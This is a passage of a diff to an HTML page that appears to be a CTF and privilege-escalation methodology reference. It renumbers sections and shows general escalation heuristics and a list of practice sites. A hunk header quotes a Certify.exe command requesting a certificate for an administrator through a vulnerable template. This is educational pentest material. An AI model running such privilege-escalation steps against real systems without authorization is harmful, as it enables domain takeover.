+│   port retrieve stored credentials or achieve code execution as SYSTEM
+└─ Always check installed backup/enterprise-management software versions
+    against known CVEs — these products run with broad privileges by design
+    and are a favorite target precisely because of that
+</code></pre>
 <h3 id="25-tool-cheat-sheet-windows">2.5 Tool Cheat-Sheet (Windows)</h3>
 <table>
 <thead>
@@ -1686,7 +2181,7 @@ Certify.exe request /ca:CA-SERVER\CA-NAME /template:VulnTemplate /altname:Admini
 </table>
 <hr/>
 </section>
-<section id="14-cross-cutting-privesc-principles" class="doc-section cat-privesc" data-cat="privesc" data-label="PRIVESC"><h2 id="14-cross-cutting-privesc-principles">14. Cross-Cutting Privesc Principles</h2>
+<section class="doc-section cat-privesc" data-cat="privesc" data-label="PRIVESC" id="15-cross-cutting-privesc-principles"><h2 id="15-cross-cutting-privesc-principles">15. Cross-Cutting Privesc Principles</h2>
 <pre><code>General rule of thumb when stuck
 ├─ "What can I run/write that something with higher privilege will touch?"
 │   (cron, scheduled task, service restart, log rotation, file watcher)
@@ -1707,7 +2202,7 @@ Certify.exe request /ca:CA-SERVER\CA-NAME /template:VulnTemplate /altname:Admini
 6. Kernel/CVE exploitation (last resort)</p>
 <hr/>
 </section>
-<section id="15-practice-resources" class="doc-section cat-meta" data-cat="meta" data-label="META"><h2 id="15-practice-resources">15. Practice Resources</h2>
+<section class="doc-section cat-meta" data-cat="meta" data-label="META" id="16-practice-resources"><h2 id="16-practice-resources">16. Practice Resources</h2>
 <ul>
 <li><strong>TryHackMe</strong>: "Linux PrivEsc" and "Windows PrivEsc" rooms — guided, hands-on.</li>
 <li><strong>HackTheBox</strong>: retired boxes tagged for privesc practice; write your own enum checklist as you go.</li>
@@ -1716,14 +2211,11 @@ Certify.exe request /ca:CA-SERVER\CA-NAME /template:VulnTemplate /altname:Admini
 </ul>
 <hr/>
 <p><em>Use this alongside the CTF decision tree: once a pwn/web challenge (Part I) gets you initial shell access, Part II above takes over from "low-priv shell" to "root/SYSTEM."</em></p></section>
-
-
-    <footer class="doc-footer">
+<footer class="doc-footer">
       EOF — end of methodology reference. Search indexes headings, body text, and code blocks across all sections.
     </footer>
-  </main>
+</main>
 </div>
-
 <script>
 (function(){
   // ---------- Sidebar toggle (mobile) ----------
